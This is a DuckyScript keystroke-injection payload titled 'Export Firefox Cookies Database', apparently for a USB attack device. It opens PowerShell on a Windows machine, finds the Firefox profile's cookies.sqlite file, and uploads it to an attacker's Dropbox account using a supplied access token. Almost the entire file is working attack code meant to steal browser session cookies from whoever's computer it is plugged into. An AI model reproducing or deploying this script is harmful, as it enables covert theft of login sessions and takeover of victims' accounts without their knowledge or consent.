REM_BLOCK
####################################################
#                                                  #
# Title        : Export Firefox Cookies Database   #
# Author       : Aleff                             #
# Version      : 1.0                               #
# Category     : Exfiltration                      #
# Target       : Windows 10-11                     #
#                                                  #
####################################################
END_REM

REM Requirements:
REM     - Firefox must be installed

REM You must define your Dropbox accessToken or modify the exfiltration modality. Replace just the example word with your token.
DEFINE #DROPBOX_ACCESS_TOKEN "example"

EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        Windows fully passive OS Detection and passive Detect Ready
        Includes its own passive detect ready.
        Does not require additional extensions.

        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay
            $_OS will be set to WINDOWS or NOT_WINDOWS
            See end of payload for usage within payload
    END_REM

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF

    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
        IF ($_OS == WINDOWS) THEN
            STRING HELLO WINDOWS!
        ELSE
            STRING HELLO WORLD!
        END_IF
    END_REM
END_EXTENSION

GUI r
DELAY 500
STRINGLN powershell
DELAY 2000

REM Get cookies DB path
STRINGLN
    $firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
    $firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}

    $filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'

    $accessToken = #DROPBOX_ACCESS_TOKEN

    $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
    
    $dropboxFilePath = "/cookies_exported.sqlite"

    $headers = @{}
    $headers.Add("Authorization", "Bearer $accessToken")
    $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
    $headers.Add("Content-Type", "application/octet-stream")

    Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $filePath; exit;
END_STRINGLN
